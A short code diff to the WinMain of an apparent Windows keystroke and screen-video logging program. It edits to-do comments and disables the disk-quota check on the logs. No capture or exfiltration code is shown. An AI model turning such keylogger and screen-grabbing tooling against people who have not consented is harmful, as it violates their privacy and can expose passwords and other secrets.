@@ -6,7 +6,8 @@
 #include "KeyLogger.h"
 
 /** What next:
- *  	1) Video grabber!
+ *		0) Log videos to file
+ *  	1) Debug Flush chunk!
  *		2) implement list of features and write separate functions for Init and Finalize
  **/
 	
@@ -15,7 +16,7 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 {
 	DataAccumulator* dataAccumulator = new DataAccumulator();
 	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
-	quotaKeeper->KeepLogsWithinQuota();
+	//quotaKeeper->KeepLogsWithinQuota();
 	VideoGrabber* videoGrabber = new VideoGrabber();
 	KeyLogger* keyLogger = new KeyLogger();
 
@@ -38,6 +39,7 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 	keyLogger->Finalize();
 	videoGrabber->Finalize();
+
 	delete videoGrabber;
 	delete keyLogger;
 	delete quotaKeeper;
